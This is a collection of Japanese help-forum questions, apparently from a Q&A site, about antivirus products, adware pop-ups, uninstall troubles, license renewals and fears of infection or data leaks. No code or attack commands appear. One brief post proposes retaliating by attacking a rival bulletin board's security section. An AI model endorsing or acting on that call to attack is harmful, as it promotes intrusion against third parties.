PC初心者です。 先日、PC購入し、ネット回線をつないで無線LANでPC・PS３・Wiiを通信できるようにしました。 PCにはウィルスバスターを入れて対策を講じていますが、ゲーム機器も通信時にウィルスに侵されることってあり得るんでしょうか？ また、ゲームのウィルス感染があり得る場合の対策も教えていただきたいです。
先日からWindows XP で発生したエラーを修理するには、どうしたらいいですか？ だとかWindows　PC　修理 だとか書かれた広告が出てきます。 ブラウザを立ち上げてしばらくすると３０個近く…グループで開くとそのグループの方にも３０個近く勝手に出てきます。５秒間隔くらいでしつこく出てくるのですが、これはどうやって解除したらいいでしょうか？ 毎日毎日本当にイライラします。 またウィルスバスター　クラウドをかけ終わったあともこれなので、そういうのには引っかからないのかと思います。 使ってるブラウザはSleipnir for Windowsです。 OSはWindows　XPです。
ウィルスセキュリティZEROをアンインストールしたいのですが、コントロールパネルのアンインストールまたは変更の画面から選択してもエラーが出てしまいます。他にアンインストールの方法は何かあるのでしょうか？
マカフィーセキュリティーセンターをインストールしたら、PCの動きが悪くなってしまいました。HDが動きっぱなしで。マカフィーに問い合わせして、PC内を確認しました。 CドライブProgram Filesに『avg secure search』があります。 知らないうちに。それが原因しているそうです。 プログラムのアンインストールのリストには有りません。 削除は自分で・・ということなので 削除したく調べました。 IEのアドオンの管理でその対処が出来るようですが、私の場合　アドオンの管理のリスト表示にそのAVG secure searchリストがない為、処置できません。 どなたか対処方法をご存知の方、ご教授いただきたくお願い致します。 削除方法を教えていただきたくお願い致します。 困ってます。 PCはウィンドウズ７　32ビット　インターネットエクスプローラーを使用しています。
現在、ノートンインターネットセキュリティ２０１２（２年版）を使用していて、有効期限が１か月を切りました。 更新の為、「NORTON INTERNET SECURITY 同時購入1年版」（２０１２発売の商品）を購入する予定です。 １．このソフトを２本以上購入し、２年目、３年目の更新に使用する事は可能でしょうか？
JAVAをパソコンにインストールしています。 ブラウザでサイトを見てJAVAの脆弱性を攻撃されるケースについてご教示ください。 ブラウザ上ののアドオン・プラグインの設定でJAVAを無効にしていても悪意のあるサイトを訪問するとJAVAの脆弱性を突いて攻撃されるようなのですが それでは http://www.java.com/ja/download/help/disable_bro … http://www.java.com/ja/img/download/enable_java. … のように、 Javaコントロール・パネルでのJavaの無効化 (「ブラウザでJavaコンテンツを有効にする」のチェック・ボックスの選択を解除) をしているとどうなるのでしょう？ それでもやはり悪意のあるサイトを訪問するとJAVAの脆弱性を突いて攻撃されてしまうのでしょうか。
ノートン２０１２（ニコニコパック）を使用しているのですが、残り期限が１か月になり更新を考えております。 ※ＰＣ　ＳＯＮＹ　バイオＶＰＣＣＢ１９ＦＪ/D（Ｗｉｎ７） （ＰＣ１台のみ使用） 調べてみると２０１３年から年号表記が廃止されていて、ニコニコパック（２年）もないようでした。 質問１：下記のソフトのいずれかを更新用に購入したいのですが、各ソフトの違いは何でしょうか？ ※いずれのソフトも問題無く更新出来て使用出来るなら、安価なソフトを購入したいと考えています。 １．ノートン セキュリティ 優待版(最新版 日本語・正規) ２．NORTON INTERNET SECURITY 同時購入1年版 ３．NORTON INTERNET SECURITY 同時購入1年版 質問２：ソフトの到着が有効期限に間に合わない可能性を考え、体験版（仕様版）を使って、到着後にソフトにて更新したいのですが、手順を教えて下さい。 ※以前、試してみたら失敗し、有効期限が反映されないミスをしてしまいました。 今回は失敗しないように手順を知りたいです。 以上２点です。 宜しくお願いいたします。
四年目になるパソコンが 去年ぐらいから ほとんど動かなくなってしまいました うごいたとしても とちゅうでとまったり 絵をかいてると 途中でエラー？みたいなのが出て 消えます(/ _ ; ) 画像や履歴とかも 消していて 容量的にはいけるはずなんですが... Windows7?のやつです、 ウイルスにやられてるというか エラーがあるっていうか... ウイルススキャン?エラースキャン?みたいなの あるじゃないですか、 それやったら めっちゃエラー 出て 危険状態みたいな感じで(^_^;) 有料（3000円ぐらい）のを ダウンロード? （ガンガンガン速みたいなやつ） したら、 昔みたいに軽くうごくんでしょうか？ また、そういうの（高速ソフト?）は、 どれがおすすめですか？！ ちなみに中学生ですm(_ _)m お父さんはパソコンとかぜんぜんしてないし 未だにガラケーで、 お母さんもパソコンとか ぜんぜんできないんで たすけてください。゜(゜´Д｀゜)゜。
アンチウイルスソフト自体がトラッキングやスパイウェアやウイルスになってないか、 という不安を除外できるのはオープンソースソフトだけだと思うのですが、 windowsでオープンソースのアンチウイルスソフトはあるのでしょうか？ clamavはwindows版はオープンソースではないようです。
いま、windows８にkaspersky2013をインストールして利用しているんですが、8.1にアップデートするとして、kaspersky2013はそのままインストールしたままアップデートして大丈夫なんでしょうか？ 8.1アップデート前に一度アンインストールして、8.1アップデート後にまたインストールしなおす必要がありますか？ 経験者の方がいたら教えてください。
私はPC初心者だけに何が何だか良く解りませんがノートPC、windows7、Norton360からpowerイレイザーを何回実行しても結果は失敗表示が出ます。差し当たり何でも無いのかも知れませんがPCの動きが悪くデフラグ、errorcheck、完全scan、AVGワンクリックmaintenance…考えられる作業したつもりですがPCの動きが遅く不調なだけに気に成るのですが問題が有るとすれば\REGISTRY\USER\S-1-5-21-1620673095-2922092623-4062269128-1000\SOFTWARE\Microsoft\windows\Currentwersion\explorer\advanced\"HideIcons"のversionが古い為、セキュリティリスクが発生する可能性有るからversionUPを…とNortonpowerイレイザーは表示します。どうしたら宜しいですか?。versionUP方法等々、セキュリティリスクが発生しない方法を教えて下さい。ノートPCのhard使用量30%強、外付けも50%程度で問題は無いと思ってます。復元やrecoveryは最後の手段ですが余り使いたく有りません。それと先程の古いversionは何の関係のfileで、どんな働きをしてますか?例えば普通に削除したら、どう成りますか?fileの開き方や場所も教えて戴きたいと思いますし更にwindowsアップデート等々で再度download&instalを要求され続けますか?その場合、要求されない設定にする方法も併せて何卒宜しく御願い致します。
ここ最近ソフトが入っていてアップデートもしている状態であるにもかかわらず、 Windowsのセキュリティセンターの「ウイルス対策」が勝手に無効とされてしまいます。 これはどうしてでしょうか？ 一度ＺＥＲＯをアンインストールし、再度入れなおして落ち着き、安心してＰＣを使っていましたが 今月になってまたおきてしまいました。 WindowsのメッセージではＺＥＲＯがインストールされていると認識しているにもかかわらず 赤いマークが出ているのはとても気になります。 無視していいものか、それとも何かやったほうがいいのか教えてください ＺＥＲＯのほうはアップデートは先ほど実行され、設定もすべて有効になっています。
ウイルスバスターの自動更新のお知らせが来ました。 しかし、更新期間は1年で3年に換算すると、 量販店で新規に3年版を購入した方がずっと安いのですが これっておかしくないですか。
Regclean pro画面に出て消したいのですが、どうすればいいですか？ 「スパイウエアが検出されました」や「パソコンの性能が低下していませんか？」など画面に出てきます。リカバリーは、リカバリーディスクがないのでできません。 ｘｐのｃｄもありません。
２ヶ月前ぐらいから、インターネットを立ち上げてクリックすると、「あなたのＰＣ危険」「容量不足」などの前面広告が突然ランダムに開いてしまいます。閉じればそれで完結してしまうのですが、日に３～４回開くのでうっとおしいのです。以前のような広告が出ない状態にしたいのですが、どうしたら良いでしょうか。「システムの復元」は行いましたが、解消されませんでした。ウィンドウズＸＰです。
XPを長年使っています。が、4月のサポート終了があるため、しばらく前に、新しいパソコンを購入しました。 今は、XPをメインに、新しいパソコンは（操作が難しいので）サブの形で使っています。 XPには昨夏購入したウイルス対策ソフトを、新しいパソコンでは最初から入っているウイルス対策ソフトを使っています。 でも、新しいパソコンのウイルス対策ソフトの無料試用期間が過ぎたら、（これからインターネットをする事が少なくなる）XPに入っているウイルス対策ソフトをアンインストールして新しいパソコンにインストールするつもりです。 ですが、まだ数ヶ月はXPでもインターネットをしますし、サポートが終了してインターネットをしなくなっても、新しいパソコンでは使えないソフトがあるので、XPは使い続ける予定でいます。 そこで、格安か無料でこれからも使える、XPにおすすめのウイルス対策ソフトを教えていただけないでしょうか？
新しいコンピュータを買い、インターネットのダウンロードで、セキュリティーソフトの「ゼロ」を買いました。メールで購入完了連絡がきたので、インストールをしましたが、「保存」などのボタンを押した後、勝手に液晶画面が消えて（Windows８のタッチパネル併用のノートブック）、正しくインストールしたか？分からなくなってしまいました。 通常、正しくインストールされれば「アイコン」が出てくると思いますが、見当たりません。 (1)セキュリティーソフトが正しくインストールされているか？確認する方法 (2)セキュリティーソフトのアイコンの表示方法 以上の２点、教えてください。 よろしくお願いします。
This ad block by:Lijit,pulsepoint広告が3日前くらいから画面いっぱい出てきて困っています。広告を消したいのですがどうやって消したらよいのかわかりません。消し方をわかりやすく教えて下さい。お願いします。
Symantec Antivirus 11.0を会社のモバイルPCで使っており、リモートアクセスをしようとしていますが、ウイルス定義ファイルが最新ではないとの表記が出ます。 Intelligent Updaterも使って完了はするのですが、リモートアクセス時最新ではないとの表記が出ます。またliveupdateをしても同様です。 ついこの間1週間前はリモートアクセスが使えたのですが、一度liveupdateのボタンを押してから上記の表記が出てリモートアクセスができなくなりました。対処法を教えていただけますか。
題のとおり セキュリティソフトのサポートって どんなものなのか？ が気になりました。 実際にウイルス感染した場合 として サポの連絡を メールあるいは電話 でするとして その場合 ネットが使えるウイルスであれば (1) ネットを介した 遠隔作業 なのか？ (2) （場合によるかもしれないけど） 特定の駆除ソフトを勧められるのか？ (3) その他 （（あれば理由・その方法はどんなものか？） 等が 気になりました。 もう一つ。 PC操作を出来なくする 偽セキュリティ等で ネット自体が ウイルスが使用するサイト以外ブロックされる場合には 遠隔作業が出来ないので この場合は どうなのか？ (1) 連絡は 電話か他の端末によるメール等か？ (2) 出張してくれたりするのか？ (3) （その他） まさかネットから 指定のソフトを落として来い なんていわないよね？ｗ セキュリティソフトのサポートを受けた人や その時の経験 成功や失敗談など 聞いてみたいです。 疑問なのは メールや電話だけとした場合には 指示された方法や 言葉の意味が分からなければ 対処のしようがないのでは？ という点。 こういう場合は けっきょく リカバリを勧められるのでしょうか？
新しいパソコンとウイルスバスタークラウドのパッケージ版（3年）を購入しました。 新しいパソコンにウイルスバスターの体験版がインストールされており、 ダウンロード版であればいつ購入しても体験版の使用期間分も保持できる とありました。 パッケージ版の場合も同じでしょうか？ それともパッケージ版はシリアル番号を入力した時点から3年となるのでしょうか？
親戚の人にパソコンを立ち上げるとおかしな画面が出るので直して欲しい相談されました （XPのサポートまでIEが使用できれば良いとのこと） WINDOWS　XP　HOME　EDITION　Version　2002 　service　Pack3　 Norton　Internet　security　2005 起動後　IE（ver8）を開くとregclean　pro　の画面が真ん中に出てIEを操作できません タスクマネージャでタスクの終了を押し対応していましたが、PC起動時に初めてIEを開くたびに この処理をするのが大変なので、 regclean　proをuninstallしたら　Norton　Internet　security　までがサービスを中止しましたの メッセージが出て困っています。 Norton　Internet　security　の画面では どう処理しますかのラジオボタンの２者択一の選択画面が出ます (1)セキュリテイソフトを購入するためのオプションを見直す (2)、Norton　Internet　securityのアンインストール のいずれかとなります。 XPが４月にサポート停止になるのでそれまでは費用をかけたくないのです。 4月過ぎにIEだけ見れるPCを購入しようと考えています どなたかアドバイスお願いいたします （レジストリ操作は経験がないので避けたい） ※NORTONの契約時の資料は見当たらないようです
コミックの解凍をしたくRAR？ファイルを解凍できるという無料体験の「WinRAR」をダウンロードしてから、Googleで検索の度にゲームのページに飛ばされたり、アダルトの広告が増えたり、色んな弊害が増えました。 なので解凍ソフトの「WinRAR」をアンインストール？削除？（コントロールパネルのプログラムのアンインストールから）し、Googleの設定の拡張機能からも全て削除しました。 そうすると、他のページに飛ばされることもアダルトの広告もなくなりました。 しかし、落ち着いたなと思うと数分後には”数字や単語がむやみやたらにリンク化”されるようになります。設定の拡張機能から削除しては数分後に現れるの繰り返しです。何度も同じ事をやっていて気づいたのですが、毎回同じファイル？を削除しているのです。 「Fiun DeaLLs」という名のファイルです(画像も参考にして下さい) 何が原因でどういった対処で防ぐことが出来るのかしりたいです。
家庭内無線ランにしようとして、無線ＬＡＮ親機をセットしました。 設定は無事終了しました。 ネットにもつながりました。 Ｍｏｚｉｌａ　Ｆｉｒｅｆｏｘでネット閲覧しました。 ブックマークしたところを見ると頭のマークが勝手にＹの字に変更されていて、 そこを、クリックすると、英語版のＹＡＨＯＯのページが開きます。 そしてネットに繋がらなくなります。最初はひとつだけＹになっていましたが、 いまは、３箇所にＹの字がついてます。 これを、削除して元にもどすにはどうすればよいのでしょうか。 説明不足のときには、後で追加しますので、よろしくお願いします。 無線ラン親機はＢＵＦＦＡＬＯ　ＷＨＲ－３００ＨＰ２です。 ＯＣＮのＡＤＳＬでネットしています。 パソコンはマウスコンピューター製でウィンドウズ７を使用しています。
今まで設定していなかった 個人情報の保護でクレジットナンバーを登録したら １日に何回か、「クレジットナンバーの（照会？だったか）をブロックしました と出てくるのですが、 過去ではそのような、クレジットの被害など受けてはいませんが そもそも、他人のクレジットナンバーなど知ろうとする個人、企業、があるのか そんな事をするソフトでもあるのか？ そこらへんに詳しい方がおられましたら 御教授下さい、よろしくお願いします。
田原総一朗のブログですがどう思いますか？ http://www.taharasoichiro.com/cms/
Norton Internet Securityのプロダクトキーについてですが 製品の有効期限が近づいてきたので購入しようと楽天で検索したら シマンテックの正規ショップよりかなり安価で販売している所がありました。 詳しく見てみるとプログラム自体は正規の無料体験版をDLして メールで届いたプロダクトキーを入力すると 期限が延長されるみたいなので問題ないと思うのです。 レビューを読むとおおむね良いのですが、 中には認識されなかったり所定の期限を満たしていないなどが有り、 製品は中国版として登録されているようなのです。 そこで質問なのですが こういうプロダクトキーは購入して良いものなのでしょうか？ なぜこんな価格で販売が可能なのでしょうか 中国版だということで 海賊版とか不正に作成されたプロダクトキーではないですよね？ またこういうプロダクトキーで登録した場合でも シマンテックの正規のサポートは受けられるのでしょうか？ 楽天に出店のショップなので 違法な製品を扱っているとは思えないのですが 先般の優勝セール時の騒動で心配になりました。 どうかよろしくお願いいたします。
僕のパソコンは富士通の製品で、あらかじめ、ノートン社のセキュリティ・ソフトが入れられています。 多分、両社で契約していて、富士通の全てのパソコンに入れられていると推測しています。 質問は、「ＮＥＣの場合は、『トレンドマイクロ』社の『ウィルスバスター』がプリインストールされているのか？」ということです。 http://www.necdirect.jp/shop/note/versapro/vx/13 … そう考えていいですか？
お恥ずかしい話なのですが、スマホでアダルトサイトを閲覧中、 画面を拡大しようとして誤って画面端の広告を触ってしまい、 trafficfactory.bizというアドレスのサイトを開いてしまいました。 正確には、開ききる前に閉じたのですが、 これは何かしらのウィルスなりに感染してしまったと考えたほうがよいでしょうか。
どなたか詳しい方がいらっしゃいましたらお願いいたします。 windows8などで言う「システム修正ディスク」と「レスキューディスク」が示す意味の違いが分かりません。 お教え戴ければ幸いです。
nexus7　2013購入後google playから無料　ウイルスソフトAVG・・・をインストールして使用中です。 android用のウイルスソフトについては初心者で内容が分かっていませんが、皆さんはどんなソフトを購入し、使用されていますか。 今使用中の物は適応範囲が狭いとかで有料ソフトの購入をした方が良いのか思案しています。 windows用ではウイルスバスターとかその他よく聞くソフトがありますが 実際どれが良いのかアドバイス頂けますか？
今日の事なのですがPCを使用していて少し目を離してる間にFireFoxが終了していて再度立ち上げるとアドオンが全て消えていました、 ウィルスかと思いavastとウィルスバスターのフルスキャンをしてみたのですが特に検出はされませんでした、 PCにはあまり詳しく無くこんな事は初めてなのですがやはり何かのウィルスに感染しているのでしょうか？ 解決策などアドバイスをいただければ幸いです…。
レノボのノートパソコン（Ｇ５８０）を使用しています。 また、ウィルスソフトとして、ソースネクストのスーパーセキュリティzeroを使っています。 つい、一昨日気づいたのですが、ウィルスソフト（スーパーセキュリティzero）がアンインストールされ ていました。 ネットバンクなどいくつか使用しているので、とりあえず、ＰＣを閉じて、ソースネクストのサポートに電話。 けれど、「ありえない」の一点張りでした。 ともかく、再インストールして、ウィルス検査してみると、６７ほどのウィルスを発見して駆除した、とのメッセージが出ました。（ウィルスは自動的に駆除） 「えーっ！」と、驚いて、ネットバンクのパスワードをすべて変更しました。 ウィンドウズのアップデートなどもしました。 そして、念のため、もう１度ウィルス検査してみると、５個のウィルスに感染しているとのこと。 （自動的に駆除） で、もう１度、ネットバンクのパスワードを変えました。 そして、さらにもう１度ウィルス検査してみると、２個のウィルスに感染していて駆除したとのこと。 ・・・・大変でした。 質問ですが、この状況の原因、そして対策はあるでしょうか。 ウィルスソフトをアンインストールするなど、どれほど寝ぼけていてもしないと思いますし、何かの操作間違いで、そんなことになったりするんでしょうか。 中国のレノボは、英国の諜報機関がＰＣ内の情報を勝手に送信しているとかいう ニュースがあったような気がします。 バイドゥＩＭＥも、打ち込んだキーボードの文字を送信していたとか。 原因と対策について、ご教授いただければ幸いです。 よろしくお願いします。
アメブロユーザーです。 アメブロの方で特別変なことをしてないのですが、他の方のブログを閲覧するとセキュリティソフト（ESET）が反応することがあります。 ポップアップを見た限りjpeg画像をブロックしているようなのですが、いずれの場合も以下の画像（スクリーンショットです）が表示されたときに反応しているようです。 以下の画像はいわゆる「jpgウィルス」の類なのでしょうか？ アメブロで悪意ある画像を用いた広告は掲載しないとは思うのですが…… 詳しい方、お教え願いますm(_ _)m
インターネットをしていたら少しの間だけ勝手に動きました。 ページを開いたり、スクロールが上下したということではなく、 キーボードの上キーを押すとマウス代わりに動くじゃないですか、それをずっと押した感じの動きで、画面の中を動いてい ました。 分かりにくくてすみません＞＜ これは、ウィルスなどではないのでしょうか？
先日 Windows8.1のPCを買いました。 その時に一緒にノートンセキュリティを買ったのですが、箱には8までしか書いてなくて、使えるのかなと思って。 馬鹿らしい質問だとは思いますが宜しくお願いします。
「製品を準備しています　お待ちください．．．」 の画面から、３０分以上先に進みません。 どうしたらよいのでしょう？
中国のサイトからソフトダウンロードし、インストールしたところ、いくつかのソフトウエアが勝手にダウンロードされるようになりました。 インストール時に、一緒に他のプログラムもインストールされるのではなく、PCを使用していると、勝手にインストールされてしまいます。 そのたびにアンインストールし、レジストリも関連してそうなものは削除しますが、しばらくすると、また、勝手にインストールされます。 対策には関係ないかと思いますが、昼間にインストールされる事は、あまり記憶にありません。 夜中にPC を使っていると、インストールされる事があるように感じます。 AVG AntiVirus、Spybot は入っていますが、インストールは禁止できません。 Advanced Uninstaller にインストールチェッカーという機能があるので使ってみましたが、インストールされたことを報告するでけで、インストールは行われてしまいます。 外部から、インストーラーがダウンロードされ、それを起動しているようです。 インストールの前に、実行の許可を確認するような設定、またはソフトウエアは無いでしょうか？ 使用している OS は、Windows XP です。 インストール権限などを使ってインストールの制限をすることも出来るようですが、外部からインストーラーをダウンロードし、実行する場合は無効のようです。 以上、よい案があったら教えてください。
あの連中がああいう事を繰り返すのならば対抗処置として某掲示板のセキュカテを攻撃しませんか？ そうすればあいつらも今までしてきた事の意味がわかると思いますが。
フリーのウイルスソフトをインストールしたいのですが、何が一番宜しいでしょうか？ 今は　Avira　を入れているのですが、スパイウェアーがダメみたいなのでスパイボットも入れてみたのですが、検索の時間が掛るし相性もあまり良くないような感じです。 総合的なものがあれば良いのでしょうが、何が適当かわかりません。 仕様は　windows７ professionnal です。機種は　sony　の　ｖaio　です。 本当は有料の総合セキュリティーが良いのは解っているのですが、何分このご時世で、出来ればと思いまして。 宜しくお願いします。
パソコン（Windows7）のウイルス対策を無料で行いたいのですが、仕組みがよくわかりません。 アバスト! 無料アンチウイルス 2014 というものを試しにインストールしてみたのですが このソフトを入れておくだけでウイルスを撃退してくれるのでしょうか。 それとも発見をしてくれるだけで、対策は別に行わなければいけないのでしょうか。 とても基本的なことから理解できていなくて申し訳ないのですが、解答いただけると助かります。
最近問題になってる百度（バイドゥ）を何も知らずにインストールしてしまいました。 そのプログラムがある間に、某ネット銀行を利用してしまいました。 バイドゥは、入力した文字はもちろん、IDやパスワードも流出してしまうとのことですが、 ネット銀行を利用した際、IDやパスワードも入力してしまいましたので、 これらも流出してしまったのではないかと非常に心配しています。 一番懸念されることが、流出したデータで勝手に出金や振込されることです。 やはりそんなことをされる可能性は大きいのでしょうか？ また、その対策として具体的にどうすればいいのでしょうか？ お金に関することなので、是非ともご回答よろしくお願いいたします。
ノートンのスキャンができません４回目 放っておいたら治りませんか カスタマーセンターに連絡したほうがいいのですか 以前はノートンのサイインストールで治った？
ノートンインターネットセキュリティー 2013について質問させて頂きます。 今までは、システムの完全スキャンが、自動で行われていましたが、 何も操作していないのに、3週間前から、スキャンが自動で行われずにいて困っています。 画面がオレンジ色に変わり注意と出て、慌てて手動でスキャンを行っていますが、不便です。（＊手動スキャンから１週間で、画面がオレンジに変わり注意とでます。） 今までのように、自動でスキャンできるようにしたいのですが、操作方法が解りません。 すみませんが、教えて頂きたいのですが・・・。 宜しくお願いします。 ＊OSは、Windows8です。
中国製の無料セキュリティソフトである「Kingsoft」を使っていたのですが、同じく中国の「百度（バイドゥ）」が提供する無料ソフトがユーザーに無断で入力した内容を収集していたというニュースを本日見て不安になりました。 中国製以外で、おすすめの無料セキュリティソフトがありましたら教えてください。
無料ソフトのダウンロードを行った時にBaidu IMEがインストールされたみたいで、特に異常も無いようだったのでそのまま使用しているのですが、今日の新聞の情報で「Baidu IMEはウィルス・ソフトだ」といった意味のことが載せられていました。 そうであれば削除方法を教えて下さい。
　突然、複数のウィルス対策製品がインストールされている、この状態では問題が発生するから、 　他の対策をすべて削除してMcAfreeのリライブスイートパケージの保護対策を利用しろと出るので　　すがMcAfreeをいれたおぼえはないのですが、知識不足でいつか入れてしまったのかも。 　そもそもMcAfreeとは安全なウィルス対策製品なのでしょうか、教えてください。
カテ違いかも知れませんが宜しくお願いします。 以前、福祉施設を利用していた時に職員さんが「スタッフルームの中にあるパソコンの中には個人情報が一杯入っているから、スタッフルームには入ってもらっては困る」というような事を言っていたので果たしてpc(インターネットに接続されている)に個人情報入れて大丈夫なのかな？と疑問に感じ たのでどれ位その職員さんがpcの知識があるのか質問してみました。「何々さんが今仕事で使って るpcのosって何ですか？」その方は自分が使っているpcのosが何なのかさえ答えられませんでした。 勿論インターネットにも接続されています。その程度の知識では多分どんなセキュリティソフトを入れ ているかも知らないでしょう。もしかしたらセキュリティソフトを入れていないかもしれません。 セキュリティをどれだけ万全にしても100%pc内のデータが外部へ流出することを防ぐのは不可能です。 方法は一つしかありません。pcに入れないことです。 医師でも個人のデータが入ったpcをそのままインターネットに繋げている人を結構みかけます。 一応セキュリティソフトは入れている人もいましたが、個人のデータが入っているpcをそのままインターネットに繋げている時点でそんなにセキュリティの知識が無いように感じます。 もし、私だったらあくまで理想ですが、個人のデータが入っているpcとインターネットに接続している pcは物理的に絶対に繋げないようにすると思います。usbメモリー等のメディア経由でのデータの流出も最近は非常に多いです。 以前結構大きな病院でスマホを使っていたらその病院で使われていると思われる無線ＬＡＮの アクセスポイントが見つかりました。無線ＬＡＮを使う場合のセキュリティ対策は色々ありますが、 その病院では無線ＬＡＮのアクセスポイントの名前を病院名だと分かる文字列プラス何階という文字列の組み合わせにしていました。一応暗号化はしていましたが、暗号化キーはwepでした。 これだとある程度知識のある人間なら簡単に侵入することうが可能です。不正アクセスになる可能性があるのでやっていいかどうかは別問題ですが。 たた個人情報を守る守秘義務を持っている立場の方がこの程度のセキュリティの知識で守秘義務を守っていることになるのでしょうか？ これは仕方が無いことなのでしょか？ しかし私のデータをpcには入れないで下さいとは言えないですからね。 ご意見をお聞かせ下さい宜しくお願いします。
現在ＥＳＥＴセキュリティを使っています。 来年初めには期限切れになるので、今回は１０年程更新料が無料の セキュリティZERO系（クラウドかスーパー）に変更したいと思っています。 同じように変更した人の評価を聞きたいのです。 更にクラウドセキュリティZEROとスーパーセキュリティZEROの違いが今一分かりません。 性能面や使い勝手などの違いを分かる範囲で教えてください。 よろしくお願いします。
中国の動画投稿サイトで動画を見ようとすると ブラウザ(firefox) または flash player(plug in container for firefox)が アドレス 127.0.0.1 ポート番号 xxxxx (色々) へアクセスしようとします。 (A) これは自パソコンのポート番号xxxxx で待機しているパソコン内のアプリケーションまたはサービスへアクセスしようとしていることを意味しているのでしょうか？ (B) (A)が正しいとすると、このアクセスを許可した場合、どのような事が起こるのでしょうか？ (C) パソコンにはルーターからプライベートIPアドレス(192.168.100.2)を割り当てられています。 中国の動画投稿サイトに限らず、サイトを訪問してそのサイトのソースをブラウザが解釈したときに、サイト側でパソコン内のアプケーションを、127.0.0.1 ではなく、そのパソコン自身のプライベートIPアドレス(192.168.100.2)へアクセスさせるように仕向けることはできるでしょうか？ ファイアウォールの設定でパソコン内のアプリケーションが 127.0.0.1へアクセスした時には許可するかどうかのダイアログが表示されるようになっているのですが、 パソコン自身のプライベートIPアドレス(192.168.100.2)へのアクセスの場合は許可するようになっているのでセキュリティ上問題あるかもしれないと心配です。 パソコン内のアプリケーションが自パソコンへアクセスした場合には、プライベートIPアドレス(192.168.100.2)ではなく自動的に127.0.0.1になり安心なのでは、、という気もするのですが... (A)(B)(C)についてご教示願います。
先日、レグクリーンプロというソフトをクレジットカード決済で購入してしまいました。 あとで、悪質な詐欺ソフトだということを知り解約したいと考えました。 解約するにあたってどのような手順を踏めばよいでしょうか？ クレジットカード番号などの個人情報を入力してしまったため、とても不安です。 回答のほうよろしくお願いします。
お勧めのウィルスソフトを教えて下さい。 もちろんウィルス対策ソフトでもセキュリティソフトでもアンチウィルスでもありません。 お勧めのウィルスソフトです。
Windows Defenderでフルスキャンして「望ましくない、または害を及ぼすソフトウエアは検出されませんでした」と表示されましたが、ネットで無償お試しソフトでスキャンしたら、次のような例をはじめ４４件の完成ファイルを発見しましたと表示され、ソフト購入を促すメッセージに導かれます。trojanをＷＤで検出できないというようなことがあるのでしょうか？（無償お試しソフトは　SYSTWEAKという会社のAdvance System Protectorです）　それともこの無償ソフトは、問題内容なものを検知してソフト購入させようというようなものでしょうか？　 感染ファイル名 trojan.agent カテゴリー Trojan 脅威レベル High 実行されたアクション NoActionTaken 感染発見数 9 発見されたエリア Memory 詳細 ファイル名 c:\users\user\appdata\locallow\adobe\acrobat\10.0\cache\aclang_accessibility.jpn
Fire foxをインストールしたのですが私には使い辛くてアンインストールしました。 その後、Program Filesに残っていたそのブラウザ関連のものと思われるファイルを削除しました。 Common Filesもそのうちの一つかと思い、いくつか（多分20個くらい）を、警告のメッセージなどを無視して削除してしまいました。 具体的に何を削除したのかは分かりません。 どのような弊害が考えられますか？ また、その弊害が起こった場合、どのように対処すればいいですか？ PC初心者の頓珍漢な質問かもしれませんが、分かり易く教えて頂けると助かります。
先日からIEを立ち上げるたびにホーム画面がAskに変わっていて困っています。 OSはWindows7,IE11です。 ・ホームのＵＲＬをＧｏｏｇｌｅに変えてみても、再び立ち上げると変更されています。 ・インターネットオプション（アドオン、検索プロバイダーにもＡｓｋ（既定になっている）があり、削除はしましたがそちらも復活してしまいます。 （また、ツールバー，拡張機能の一覧に、発行元や名にＡｓｋが付くものは確認できませんでした。 ネットで調べてみるとAsk.comというフォルダを削除すればいいという方法が多かったのですが、 検索をかけてもパソコン内でＨｉｔしません。 （隠しフォルダや保護されたオペレーティングシステムは表示している状態） 自分で一覧に目を通しましたがそれでも見つからず。 また、プログラム追加と削除の一覧にもＡｓｋと名の付くものは確認できませんでした。 ----------- パソコン初心者の私が調べながら探ってみましたが残念ながら手詰まり状態です。 詳しい方のアドバイスをお願いいたします。
Android・iPhone端末に影響を与えるウイルス(トロイの木馬など)について質問です。 主にSNSなどによってURLを押すことや、ファイルをダウンロードすること以外にも感染方法はありますか？ また、 ・何をすれば影響を受けますか？ ・どんな影響を受けますか？ ・対策方法はありますか？ ・例を教えて下さい 質問攻めでごめんなさい(´Д⊂ヽ 友達がかかってしまったかもしれないので、早急に回答お願いします(T T)
PCの右下に添付した画像のようなものが出てきました。 昨日、freemake video converterをインストールすると、ウイルスが検出されたり、写真やビデオなどのフォルダーに『Thumbs.db』というものが全てのファイルに入ってしまっています。 デスクトップに３つくらいファイルがあったのでそれらを削除、ドキュメントフォルダーにあったファイル４つくらいを削除した結果、ドキュメントがdocumentsに、ピクチャーがpicturesなどと英語表記されてしまい、直すことができません。 なぜ、こうなったのかや、直し方を教えてください。 お願いします。
PCの初心者なんですが、最近のノートンにファイアーウォールがないのは何故なのでしょうか？詳しく教えて下さい。
カスペルスキー2013を使っていて、2014へのアップグレードが発表されたので早速アップデートしてみたのですが・・・設定できる項目が少なすぎませんか？例えば、2013ではファイルスキャンの設定で、「高、推奨、低」があり、更に詳細設定でスキャンするドライブ（ローカル、リムーバブル、ネットワーク）やスキャン技術、更新されたファイルのみスキャン、ヒューリスティックスキャンの強度（高、中、低）など、非常に豊富な詳細設定ができました。しかし2014の設定画面を見てみると、「ファイル保護」の項目には「高、推奨、低」のスライダーしかなく、詳細設定の仕方がわかりません。できなくなってしまったのでしょうか？ やり方がありましたら、教えてください。 よろしくお願いしますm(_ _)m
ウイルスに感染したようなので、取説を見ながら何とかセットアップまでこぎつけましました。 ウイルスバスター（２００７→２０１０）の期限が切れていたので、電気屋さんで３年のウイルスバスタークラウドを購入してインストールしようと試みましたが、途中で中止されてしまいます。 以前のウイルスバスターがいたずらしているのかと思い、アンインストールしようと思いましたが、その方法も見つからず… 使用しているソフトはビスタです。 何でインストールできないんでしょうか？ お分かりになりましたら教えて下さい。 初心者なので分かりやすく教えていただくと助かります。 よろしくお願いいたします。
